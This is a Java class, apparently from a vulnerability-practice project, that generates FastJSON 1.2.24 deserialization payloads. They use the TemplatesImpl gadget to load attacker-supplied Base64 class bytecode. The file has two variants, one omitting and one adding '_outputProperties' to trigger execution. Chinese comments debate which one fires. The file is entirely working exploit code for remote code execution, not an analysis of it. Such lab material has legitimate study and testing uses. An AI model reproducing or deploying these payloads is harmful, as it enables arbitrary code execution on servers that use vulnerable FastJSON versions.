package com.govuln.fastjsonattack;

import java.util.Base64;

/**
 * FastJSON TemplatesImpl Gadget（修复版）
 * 
 * 问题：FastJSON 在设置 _outputProperties 时会立即调用 getOutputProperties()
 * 解决方案：不设置 _outputProperties，而是通过其他方式触发
 * 
 * 实际上，在 FastJSON 1.2.24 中，TemplatesImpl 的利用需要：
 * 1. 开启 Feature.SupportNonPublicField（已开启）
 * 2. 确保字段设置顺序正确
 * 3. 或者使用其他触发方式
 */
public class FastJSONTemplatesImplFixed {
    
    /**
     * 生成基于 TemplatesImpl 的 FastJSON payload（修复版）
     * 关键：不设置 _outputProperties，避免提前触发
     * 
     * 注意：这个方法可能仍然无法工作，因为 FastJSON 需要某种方式触发 getOutputProperties()
     * 更好的方案是使用其他 Gadget 链
     */
    public String getPayload(byte[] clazzBytes) {
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        sb.append("\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",");
        sb.append("\"_bytecodes\":[\"").append(Base64.getEncoder().encodeToString(clazzBytes)).append("\"],");
        sb.append("\"_name\":\"a\",");
        sb.append("\"_tfactory\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\"}");
        // 注意：不设置 _outputProperties，避免提前触发
        // 但这可能导致无法触发漏洞
        sb.append("}");
        
        return sb.toString();
    }
    
    /**
     * 生成带 outputProperties 的 payload（尝试版本）
     * 如果这个不行，说明 FastJSON 1.2.24 的 TemplatesImpl 利用可能不适用
     */
    public String getPayloadWithOutputProperties(byte[] clazzBytes) {
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        sb.append("\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",");
        // 先设置所有必要字段
        sb.append("\"_bytecodes\":[\"").append(Base64.getEncoder().encodeToString(clazzBytes)).append("\"],");
        sb.append("\"_name\":\"a\",");
        sb.append("\"_tfactory\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\"},");
        // 最后设置 outputProperties，希望此时所有字段都已设置好
        sb.append("\"_outputProperties\":{}");
        sb.append("}");
        
        return sb.toString();
    }
}


